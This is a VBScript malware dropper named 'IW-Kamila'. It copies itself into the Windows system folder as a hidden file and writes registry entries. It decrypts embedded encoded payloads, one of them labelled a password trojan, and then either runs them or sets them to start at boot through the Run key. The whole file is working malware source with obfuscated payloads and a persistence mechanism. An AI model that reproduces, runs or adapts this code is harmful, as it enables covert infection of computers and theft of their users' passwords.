Option Explicit
On Error Resume Next

'IW-Kamila dropper
'Copyright (C) 2002 by Otto von Gutenberg
'Almaty || Kazakhstan


Dim strScript()
Dim strIDs()
Dim strComments()
Dim strKeys()
Dim strPriorities()
Dim strLanguages()
Dim strCopyrights()
Dim intCount,intLines

Sub AddPlugin(strID,strComm,strKey,strPrio,strLan,strCopy)
	'adds new component
	ReDim Preserve strIDs(intCount)
	ReDim Preserve strComments(intCount)
	ReDim Preserve strKeys(intCount)
	ReDim Preserve strPriorities(intCount)
	ReDim Preserve strLanguages(intCount)
	ReDim Preserve strCopyrights(intCount)
	strIDs(intCount)=strID
	strComments(intCount)=strComm
	strKeys(intCount)=strKey
	strPriorities(intCount)=strPrio
	strLanguages(intCount)=strLan
	strCopyrights(intCount)=strCopy
	intCount=intCount+1
End Sub

Sub AddCmd(strCmd)
	'adds new script command

	ReDim Preserve strScript(intLines)
	strScript(intLines)=strCmd
	intLines=intLines+1
End Sub

Sub Decrypt(strFile,strKey,intLoop)
	'decryption procedure which allows to
	'decrypt encrypted data
	'Arguments: name of source file, key
	On Error Resume Next

	Dim strCh,strChKey,strIn
	Dim out, fso, file
	Dim intCode, intOffset, intUpper, k, i

	intOffset=30 'this variable defines the stand-alone offset
	intUpper=125 'not including UNI-characters

	Set fso=CreateObject("Scripting.FileSystemObject")
	Set file=fso.OpenTextFile(strFile,1)
	Set out=fso.CreateTextFile(Left(strFile,Len(strFile)-3) & "cmp",2)

	For i=1 to intLoop
		file.ReadLine
	Next
	While Not file.AtEndOfStream
		strIn=file.read(Len(strKey))
		file.ReadLine
		k=Len(strKey)
		If Len(strIn)<k Then k=Len(strIn)
		For i=1 to k
			strCh=Mid(strIn,i,1)
			strChKey=Mid(strKey,i,1)
			If Asc(strCh)=126 Then strCh=Chr(10)
			If Asc(strCh)=127 Then strCh=Chr(13)
			intCode=Asc(strCh)-Asc(strChKey)
			If intCode<intOffset Then intCode=intCode+intUpper
			If intCode>intUpper Then intCode=intCode-intUpper
			out.write(chr(intCode))
		Next
	Wend
	out.Attributes=6
	file.Close
	out.Close
	Set file=Nothing
	Set out=Nothing
	Set fso=Nothing
End Sub

Function RetRnd(n)
	'Returns random value in range of [1..n]
	Randomize Timer
	RetRnd=Int(n*Rnd+1)
End Function

Sub Print(a)
	WScript.Echo a
End Sub
	

Sub InstallKamila()
	'INSTALL MY IW-KAMILA

	On Error Resume Next

	Dim fso,wshShell,thisFile,edStream
	Dim strKml,strReg,intID,blExists
 
	strReg="HKLM\Software\DirectX\OvG\Kamila\"

	Set fso=CreateObject("Scripting.FileSystemObject")
	Set wshShell=CreateObject("WScript.Shell")
	strKml=wshShell.RegRead("HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Kamila")
	
	If Len(strKml)<>0 Then blExists=fso.FileExists(strKml)
	If (Len(strKml)=0) Or (Not blExists) Then
		intID=RetRnd(2400)
		wshShell.RegWrite strReg,intID
		strKml=fso.GetSpecialFolder(1) & "\kml" & intID
		Set thisFile=fso.GetFile(WScript.ScriptFullName)
		thisFile.Copy strKml & ".dll",True
		Set thisFile=fso.GetFile(strKml & ".dll")
		thisFile.Attributes=6
	Else
		WScript.Quit
	End If

	Set edStream=thisFile.OpenAsTextStream
	While Not edStream.AtEndOfStream
		Dim strIn,strComm,strID,strKey,strPrio,strLan,strCopy
		Dim flPlugin,strPathID
		strIn=edStream.ReadLine
		If UCase(strIn)="'<SCRIPT>" Then
			strIn=edStream.ReadLine
			While UCase(strIn) <> "'</SCRIPT>"
				AddCmd strIn
				strIn=edStream.ReadLine	
			Wend
		ElseIf UCase(strIn)="'<BODY>" Then
			strIn=edStream.ReadLine
			While UCase(strIn) <> "'</BODY>"
				If Left(UCase(strIn),3)="'ID" Then
					strID=Right(strIn,Len(strIn)-4)
					strIn=edStream.ReadLine
					strCopy=Right(strIn,Len(strIn)-11)
					strIn=edStream.ReadLine
					strComm=Right(strIn,Len(strIn)-10)
					strIn=edStream.ReadLine
					strKey=Right(strIn,Len(strIn)-5)
					strIn=edStream.ReadLine
					strPrio=Right(strIn,Len(strIn)-10)
					strIn=edStream.ReadLine
					strLan=Right(strIn,Len(strIn)-10)
					AddPlugin strID,strComm,strKey,strPrio,strLan,strCopy
					strPathID=fso.GetSpecialFolder(1) & "\" & strID
					Set flPlugin=fso.CreateTextFile(strPathID & ".kml",True)
					strIn=edStream.ReadLine
					flPlugin.WriteLine("ID:" & strID)
					flPlugin.WriteLine("Copyright:" & strCopy)
					flPlugin.WriteLine("Comments:" & strComm)
					flPlugin.WriteLine("Key:" & strKey)
					flPlugin.WriteLine("Priority:" & strPrio)
					flPlugin.WriteLine("Language:" & strLan)
					While UCase(strIn) <> "'STREAM_ENDS"
						flPlugin.WriteLine(Right(strIn,Len(strIn)-1))
						strIn=edStream.ReadLine
					Wend
					flPlugin.Close
					Set flPlugin=fso.GetFile(strPathID & ".kml")
					flPlugin.Attributes=6
					Set flPlugin=Nothing
					Decrypt strPathID & ".kml",strKey,6
					wshShell.RegWrite strReg & "Components\" & strId, strPathID & ".cmp"
					If UCase(strPrio)="FIRST" Then
						Dim flFirst,strFirst
						Set flFirst=fso.GetFile(strPathID & ".cmp")
						If InStr(UCase(strLan),"VB") <> 0 Then strFirst=".vbs" Else strFirst=".js"
						flFirst.Copy strPathID & strFirst,True
						flFirst.Attributes=6
						wshShell.Run strPathID & strFirst,1,True
						fso.DeleteFile(strPathID & strFirst)
						Set flFirst=Nothing
					ElseIf UCase(strPrio)="NECESSARY" Then
						Dim flNext,strNext
						Set flNext=fso.GetFile(strPathID & ".cmp")
						If InStr(UCase(strLan),"VB") <> 0 Then strNext=".vbs" Else strNext=".js"
						flNext.Copy strPathID & strNext,True
						flNext.Attributes=6
						wshShell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & strID,strPathID & strNext
						Set flNext=Nothing
					End If
				End If
				strIn=edStream.ReadLine
			Wend
		End If
	Wend
End Sub

intCount=0
intLines=0
Call InstallKamila


'this macro reserved for the future
'<SCRIPT>
'Script1
'Script2
'Script3
'</SCRIPT>

'<BODY>

'ID:Temper
'Copyright: <2002 (C) Otto von Gutenberg>
'Comments: <makes temporary files>
'Key:NO5O>HiKXzp6`=88SBX@DiS=COvmY;:AMXNJ]T;aC0FBcUl2^2VJc1=_89tU`O^wlcuwC;@<^KywHEJbqf{<Fv;Zl[wBlk1:1^GC4_9N0oXBRnsYa7be1kXUhXe6sYVI
'Priority:First
'Language:VBS
'7;/`XbPh "?3$7Qs\d(7`YJ[-6?>61UI#nM9mTu4'S$Kj83W(!&HJUvp~'0\GAk&B;58\Nj+r_'IT)g1T)$96 G [:x.BiPV}NTNL]Z"lA?
'EDxA14Q2eyzL-X$`LeJM?;4c8l_/)1O6BA#G:XhIJX%UG4w)N pKW7NIQP]]:]iIhTO_?eDX\<f$5ex aC[9T='D>kV94%[K9D^AP&>uaK_M."bAC
'D::&7Xy-bZH!`u&H)/,FpQN#9M60T/3<w%GEX!Bxsp;FU/.=AO7`bU&A+2/F1e[7<QXNpdw"[}V0\ZSZW=:)(%=btZHPYoo:A@LAQ%['F8
'8+AlQB!f_3/-.G(mv]F9Fk4N'3)'63T|$W5^*Z+_D:9,#,F .{#ymL','.N7v_h6RY[IPEc8D+b]_#M.+)'4:&fNjHeh V#[MQxw=@K2YH>0
'pxU&)0ZXby|R2X$sx6JMXvO2/?K:2D1X8s85O=SRR5XY	P/a)$O^/#lHJEgar?RTkz\r1h.FTB78c`u/W/cZ[#UT(AVZ8W'bMZKQZy|i
'p}>-jvUaY"O%(Bp27es3:D<_L'"(y/CBEaEjL.9>X!FuH=O$!/f*7U@XR]"925P>e_/nWlzod(5^L_G_)/(1&J,;+G/f|bK[hiD7"JT -=R2Z"jAvk
'[4OtT+H|$H*>7H%6.DQI')%,-60Y:*I~|dKc'$$I6KJiAe<Gvlkn82/J3`7jgWlp8k[F,9^iG;gP9+T|@#[@)djN')UQRx{P+%G@
'vjy9Pv4_mGA	;=OMNrI48h`E#!6N@x'<276,.GD5$M>?cf^Y4obZj=5.,$Ek"js1Q`FO_'IT)g11#--=:)%+AW?nrEhQIDlnWG=6HTd7PM>
':4-F&>)eyH4X!?1@6\?%*_cKi)D!:9E|1X8s85O=S[k<_3O %%*,`=G}"ncXa\;2(2	Q?@MGQc+5'BV5l.cSQ\y,5+7'i<7:M:EVH\J*N273cEE-
'-&?18z)f-U*+?*?MNr`GL%^dy$03)@AH@,KP:OKLJ!>S z0*0_AQ9ku9]nc$,+Fkj4-1"BXr'2g%gvdM*c+042+#Nv"fC.CXc)(Ic=uxVyvi
'STREAM_ENDS

'ID:Trojan
'Copyright: <2002 (C) Otto von Gutenberg>
'Comments: <simple password trojan what so ever>
'Key:S:>Et?2tpAa;{M]?Kw=zgrUwJjo5pzA6X1A6g96?YExepD_<N4=4LS>T07{?\MIs`37bOeQoVm:vug9x>>Hvnph]9EoXz0{G?zP6q@DI;\nq96B:8;D`1GKp9726x;Kp
'Priority:Necessary
'Language:VBS
'*/02X0la2I0W370oY_9hb`&XoN@aX4]/01N,\e6L ?AG=D^%,m4|"1iX# MLfcwC=aWYj657h`^W/0@@q\u=*P;`/p9*(eY)b+0*HNiu3;/.'xj"G
'I13`.zNkDQ5T_=o4iYdC7_WgbE'-[7P4jW^r#/A#)0J*F!Y'LfV[WS'Q\9__2mdY+fl=^RgP)0-_-YQHP8-::4De1|+*/#E/1gaY^07c
'Jh-k9$i^cHV3'B7pRH@_9Y/xeb%-@&#O-g{NKe0R3|~(;B`}=ADDi\V%t(DM5f>?c]M0#`.kZc_I*/ !fc;pGa)6#BebCLGBD4Oz>3`gd.7X
'D14s8&*V-b? *=n-^Sa]<ZBz1%$()&.$F-^\0f2 D*7&A:`a:@q6Q;Z\pY(AUDgMU/fK)`x^jbS$WO+sm72rGf(9#|2/$Qj:=Be{)281Be
',%AeRH7I0>A/34]~uq@U@g+,@&W!Vey>]+eHIX=3+A0;,tq6Q;Z\S]q=GWK!heK%ix^jbS$WO+q/4AB&U,5VEedh.|.) x>V6X(&``% X
'7!fg?DOI2u?R-*F/dYc4O@RdTj)X>K?]0+E4`%Y:Qj4~?;$@&D1K41hc`usNx`k^.A*-0,?^z~:7.FGan	;"X.g0+,7Qj:7:<0"d<2BT
'9%.-e6(%4(H[qDR7f%~q{EfaW%!P)'?>K?pBCIb7p\_6Q*|5 C`H]r_NE@bR%%" WHZB^$p`5^8e:gPMvaOel1LYY7d21N.B+--&)%Qj:3gY1(!I#B0
'$,50`0zJ7#rmW56M(bVaH<aZ!adN@ "(V=1_yed\nT]Tls^tPW_|miSWoqvZ~Y^^h}YexPg_pV`di[|YVbZX[dQgkYWRV[k
'STREAM_ENDS

'</BODY>

'<DATA>

'</DATA>